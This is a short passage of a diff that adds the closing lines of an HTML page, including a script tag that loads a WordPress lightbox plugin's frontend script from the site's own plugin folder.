+<script type="module" src="/wp-content/plugins/lightbox-photoswipe/assets/ps5/frontend.min.js?ver=5.7.3"></script>
+</body>
+</html>
